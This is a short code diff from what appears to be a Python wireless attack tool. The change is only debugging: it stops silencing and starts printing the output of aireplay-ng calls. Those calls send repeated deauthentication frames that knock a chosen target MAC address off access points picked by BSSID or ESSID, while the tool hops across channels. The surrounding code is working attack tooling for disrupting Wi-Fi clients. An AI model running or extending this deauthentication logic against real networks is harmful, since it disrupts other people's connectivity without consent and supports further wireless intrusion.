@@ -103,7 +103,7 @@ class Functs:
                 for key, value in bssid.bssids.items():
                     Functs.ChannelSys.hopper(value)
                     try:
-                        out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", get_var('target_mac'), get_var('interface')], stdout=DEVNULL, stderr=STDOUT)
+                        out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", get_var('target_mac'), get_var('interface')])#, stdout=DEVNULL, stderr=STDOUT)
                     except KeyboardInterrupt:
                         Functs.switch(Interface(get_var('interface')), "managed")
                         return
@@ -119,6 +119,7 @@ class Functs:
                 Functs.ChannelSys.hopper(channel)
                 try:
                     out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID.value, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
+                    print(out)
                     Functs.ESSID_METHOD.deauth(ESSID(eSSID.value, channel))
                 except KeyboardInterrupt:
                     Functs.switch(Interface(current_wiface), "managed")
